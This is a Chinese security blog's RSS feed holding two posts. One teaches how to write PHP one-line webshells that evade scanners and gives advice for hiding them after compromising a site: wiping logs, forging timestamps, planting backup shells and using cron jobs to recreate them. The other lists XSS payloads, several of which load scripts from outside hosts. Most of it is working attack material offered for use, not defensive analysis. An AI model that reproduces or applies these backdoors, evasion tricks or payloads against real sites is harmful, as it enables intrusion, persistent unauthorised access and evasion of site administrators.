<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>ctf - 分类 - zu1k</title><link>https://lgf.im/categories/ctf/</link><description>ctf - 分类 - zu1k</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 08 Aug 2020 09:21:59 +0000</lastBuildDate><atom:link href="https://lgf.im/categories/ctf/" rel="self" type="application/rss+xml"/><item><title>如何优雅的隐藏你的Webshell</title><link>https://lgf.im/posts/web-security/hide-your-webshell/</link><pubDate>Sat, 08 Aug 2020 09:21:59 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/web-security/hide-your-webshell/</guid><description><![CDATA[<blockquote>
<p>转自：酒仙桥六号部队 <a href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a>
这个公众号的文章质量都非常高，推荐大家关注</p>
</blockquote>
<p>拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验：</p>
<h2 id="制作免杀webshell">制作免杀webshell</h2>
<p>隐藏webshell最主要的就是做免杀，免杀做好了，你可以把webshell放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个webshell就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。</p>
<h3 id="命令执行的方法">命令执行的方法</h3>
<p>这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法</p>
<h4 id="直接执行">直接执行</h4>
<p>使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo 这是输出;&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h4 id="动态函数执行">动态函数执行</h4>
<p>我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">;</span><span class="nv">$a</span><span class="p">();</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h4 id="文件包含执行">文件包含执行</h4>
<p>有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果</p>
<p>b.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo 这是输出;&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>a.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">include</span> <span class="nx">a</span><span class="o">.</span><span class="nx">php</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="回调函数">回调函数</h3>
<p>将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$func</span> <span class="o">=</span> <span class="s1">&#39;system&#39;</span><span class="p">;</span>
<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$arr</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="php-curly-syntax">PHP Curly Syntax</h3>
<p>我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span>
<span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$a</span><span class="si">}</span><span class="s2">hpinfo();&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>![Syntax]](ex_5.png [PHP Curly)</p>
<h3 id="php反序列化">php反序列化</h3>
<p>这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;123&#34;</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;O:4:&#34;test&#34;:1:{s:1:&#34;a&#34;;s:10:&#34;phpinfo();&#34;;}&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="phpinput方法">php://input方法</h3>
<p>php://input可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，php://input会读取到，这时候我们就可以加以利用了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="preg_replace方法">preg_replace方法</h3>
<p>preg_replace函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/test/e&#34;</span><span class="p">,</span><span class="nx">phpinfo</span><span class="p">(),</span><span class="s2">&#34;jutst test&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="ob_start">ob_start</h3>
<p>ob_start函数是打开输出控制缓冲，传入的参数会在使用ob_end_flush函数的时候去调用它执行输出在缓冲区的东西。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$cmd</span> <span class="o">=</span> <span class="s1">&#39;system&#39;</span><span class="p">;</span>
<span class="nx">ob_start</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
<span class="nx">ob_end_flush</span><span class="p">();</span><span class="c1">//输出全部内容到浏览器
</span></code></pre></td></tr></table>
</div>
</div><p></p>
<h2 id="编写免杀">编写免杀</h2>
<p>上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">assert</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>这种就是最简单的一句话木马，使用D盾扫一下，可以看到5级，没有什么好说的。</p>
<p>动态函数方法,把assert这个函数赋值两次变量,再把变量当成函数执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$c</span> <span class="o">=</span> <span class="s2">&#34;assert&#34;</span><span class="p">;</span>
<span class="nv">$c</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>回调函数方法，把assert函数当作参数传给array_map去调用执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$fun</span> <span class="o">=</span> <span class="s1">&#39;assert&#39;</span><span class="p">;</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$fun</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>可以看到上面的都是通过两种方法的结合，简单的处理一下，就变成了4级，感兴趣的可以把其他的方法都尝试一下，4级的很简单，我们去看看3级的都是怎么处理的</p>
<p>通过上面的动态函数方法我们可以思考，函数可以当成字符串赋值给变量，那么变量也一定能当成字符串赋值给变量，但调用时需要用$$</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;assert&#34;</span><span class="p">;</span>
<span class="nv">$c</span> <span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">;</span>
<span class="nv">$$c</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>我们在把这种方法结合到回调函数方法中，可以看到，已经是2级了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$fun</span> <span class="o">=</span> <span class="s1">&#39;assert&#39;</span><span class="p">;</span>
<span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fun&#39;</span><span class="p">;</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$$f</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>这时候我们看一下D盾中的说明：array_map中的参数可疑，我们这时候可以用函数封装一下参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">ass</span><span class="p">(){</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;a451.ass.aaa.ert.adaww&#34;</span><span class="p">;</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="k">return</span> <span class="nv">$c</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="nx">ass</span><span class="p">();</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>1级了，离目标近在咫尺了，这时候我们应该考虑让一句话木马像正常的代码，在好好的封装一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">functiondownloadFile</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$x</span><span class="p">){</span>
    <span class="nv">$ary</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]);</span>
    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">);</span>
    <span class="c1">// assert 
</span><span class="c1"></span>    <span class="nv">$exec1</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec2</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec3</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec4</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec5</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">7</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
    <span class="nv">$as</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$exec1</span> <span class="o">.</span> <span class="nv">$exec2</span> <span class="o">.</span> <span class="nv">$exec3</span> <span class="o">.</span> <span class="nv">$exec4</span> <span class="o">.</span> <span class="nv">$exec5</span><span class="p">;</span>
    <span class="nv">$as</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$x</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$as</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">];</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="nx">downloadFile</span><span class="p">(</span><span class="s1">&#39;http://www.baidu.com/asdaesfrtafga.txt&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$c</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>再试试其他免杀工具。</p>
<p>WebShellKiller：</p>
<p></p>
<p>安全狗：</p>
<p></p>
<p>微步云沙箱：</p>
<p></p>
<p>再试试可不可以连接没有问题，完美！！</p>
<p></p>
<h2 id="更好的隐藏webshell一些建议">更好的隐藏webshell一些建议</h2>
<ol>
<li>
<p>拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除</p>
</li>
<li>
<p>把webshell的属性时间改为和同目录文件相同的时间戳,比如linux中的touch就是非常好的工具</p>
</li>
<li>
<p>目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到,尽量藏在那些程序员和管理员都不会经常光顾的目录中比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录</p>
</li>
<li>
<p>利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中</p>
</li>
<li>
<p>尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析</p>
</li>
<li>
<p>上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马</p>
</li>
<li>
<p>靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件</p>
</li>
<li>
<p>如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell</p>
</li>
<li>
<p>webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用</p>
</li>
<li>
<p>webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php</p>
</li>
<li>
<p>如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到</p>
</li>
<li>
<p>养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到</p>
</li>
<li>
<p>当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建</p>
</li>
<li>
<p>在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了</p>
</li>
</ol>
]]></description></item><item><title>xss payload</title><link>https://lgf.im/posts/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
<p>1.普通的XSS JavaScript注入</p>
<pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>2.IMG标签XSS使用JavaScript命令</p>
<pre><code>&lt;IMG SRC=1 ONERROR=alert('XSS')&gt;
</code></pre>
<p>3.IMG标签无分号无引号</p>
<pre><code>&lt;IMG SRC=javascript:alert('XSS')&gt;
</code></pre>
<p>4.IMG标签大小写不敏感</p>
<pre><code>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
</code></pre>
<p>5.HTML编码(必须有分号)</p>
<pre><code>&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
</code></pre>
<p>6.修正缺陷IMG标签</p>
<pre><code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
</code></pre>
<p>7.formCharCode标签(计算器)</p>
<pre><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
</code></pre>
<p>8.UTF-8的Unicode编码(计算器)</p>
<pre><code>&lt;IMG SRC=jav..省略..S')&gt;
</code></pre>
<p>9.7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
<pre><code>&lt;IMG SRC=jav..省略..S')&gt;
</code></pre>
<p>10.十六进制编码也是没有分号(计算器)</p>
<pre><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
</code></pre>
<p>11.嵌入式标签,将Javascript分开</p>
<pre><code>&lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&gt;
</code></pre>
<p>12.嵌入式编码标签,将Javascript分开</p>
<pre><code>&lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&gt;
</code></pre>
<p>13.嵌入式换行符</p>
<pre><code>&lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&gt;
</code></pre>
<p>14.嵌入式回车</p>
<pre><code>&lt;IMG SRC=&quot;jav ascript:alert('XSS');&quot;&gt;
</code></pre>
<p>15.嵌入式多行注入JavaScript,这是XSS极端的例子</p>
<pre><code>&lt;IMG SRC=&quot;javascript:alert('XSS')&quot;&gt;
</code></pre>
<p>16.解决限制字符(要求同页面)</p>
<pre><code>&lt;script&gt;z='document.'&lt;/script&gt;
&lt;script&gt;z=z+'write(&quot;'&lt;/script&gt;
&lt;script&gt;z=z+'&lt;script'&lt;/script&gt;
&lt;script&gt;z=z+' src=ht'&lt;/script&gt;
&lt;script&gt;z=z+'tp://ww'&lt;/script&gt;
&lt;script&gt;z=z+'w.shell'&lt;/script&gt;
&lt;script&gt;z=z+'.net/1.'&lt;/script&gt;
&lt;script&gt;z=z+'js&gt;&lt;/sc'&lt;/script&gt;
&lt;script&gt;z=z+'ript&gt;&quot;)'&lt;/script&gt;
&lt;script&gt;eval_r(z)&lt;/script&gt;
</code></pre>
<p>17.空字符</p>
<pre><code>perl -e 'print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;' &gt; out
</code></pre>
<p>18.空字符2,空字符在国内基本没效果.因为没有地方可以利用</p>
<pre><code>perl -e 'print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;' &gt; out
</code></pre>
<p>19.Spaces和meta前的IMG标签</p>
<pre><code>&lt;IMG SRC=&quot; javascript:alert('XSS');&quot;&gt;
</code></pre>
<p>20.Non-alpha-non-digit XSS</p>
<pre><code>&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>21.Non-alpha-non-digit XSS to 2</p>
<pre><code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
</code></pre>
<p>22.Non-alpha-non-digit XSS to 3</p>
<pre><code>&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
</code></pre>
<p>23.双开括号</p>
<pre><code>&lt;&lt;SCRIPT&gt;alert(a.sourse);//&lt;&lt;/SCRIPT&gt;
</code></pre>
<p>24.无结束脚本标记(仅火狐等浏览器)</p>
<pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;
</code></pre>
<p>25.无结束脚本标记</p>
<pre><code>&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;
</code></pre>
<p>26.半开的HTML/JavaScript XSS</p>
<pre><code>&lt;IMG SRC=&quot;javascript:alert('XSS')&quot;
</code></pre>
<p>27.双开角括号</p>
<pre><code>&lt;iframe src=http://3w.org/XSS.html &gt;
</code></pre>
<p>28.无单引号、双引号、分号</p>
<pre><code>&lt;SCRIPT&gt;a=/XSS/ alert(a.source)&lt;/SCRIPT&gt;
</code></pre>
<p>29.换码过滤的JavaScript</p>
<pre><code>\&quot;;alert('XSS');//
</code></pre>
<p>30.结束Title标签</p>
<pre><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
</code></pre>
<p>31.Input Image</p>
<pre><code>&lt;INPUT SRC=&quot;javascript:alert('XSS');&quot;&gt;
</code></pre>
<p>32.BODY Image</p>
<pre><code>&lt;BODY BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;
</code></pre>
<p>33.BODY标签</p>
<pre><code>&lt;BODY('XSS')&gt;
</code></pre>
<p>34.IMG Dynsrc</p>
<pre><code>&lt;IMG DYNSRC=&quot;javascript:alert('XSS')&quot;&gt;
</code></pre>
<p>35.IMG Lowsrc</p>
<pre><code>&lt;IMG LOWSRC=&quot;javascript:alert('XSS')&quot;&gt;
</code></pre>
<p>36.BGSOUND</p>
<pre><code>&lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&gt;
</code></pre>
<p>37.STYLE sheet</p>
<pre><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert('XSS');&quot;&gt;
</code></pre>
<p>38.远程样式表</p>
<pre><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;
</code></pre>
<p>39.List-style-image(列表式)</p>
<pre><code>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
</code></pre>
<p>40.IMG VBscript</p>
